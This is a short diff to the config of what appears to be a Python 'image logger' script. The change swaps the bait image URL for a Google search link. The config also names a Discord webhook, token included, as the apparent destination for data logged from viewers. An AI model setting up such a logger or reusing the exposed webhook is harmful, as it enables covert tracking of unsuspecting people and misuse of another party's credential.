@@ -13,7 +13,7 @@ __author__ = "C00lB0i"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1504591996918956062/SyDDDQG15Ybi6BRFuhIf-l1GFraPOKl45Lavw3p765Mt0Cuzfi7iQMRvod-3UzP8FoVGk",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "image": "https://www.google.com/search?q=meme+pictures&oq=meme+picture&gs_lcrp=EgZjaHJvbWUqBwgAEAAYgAQyBwgAEAAYgAQyBggBEEUYOTIHCAIQABiABDIHCAMQABiABDIHCAQQABiABDIHCAUQABiABDIHCAYQABiABDIHCAcQABiABDIHCAgQABiABDIHCAkQABiABNIBCTEyMTA2ajBqN6gCALACAA&sourceid=chrome&ie=UTF-8#sv=CAMSZxowKg5UekZ6VElyQ2Z4SElyTTIOVHpGelRJckNmeEhJck06Dk1CQVQyOUotRUJmZ29NIAQqLwobX05VSUdhci1KRFBmbzdfVVAzSlRkcVE4XzYyEg5UekZ6VElyQ2Z4SElyTRgAMAEYByC1-P-FC0oIEAEYASABKAE", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
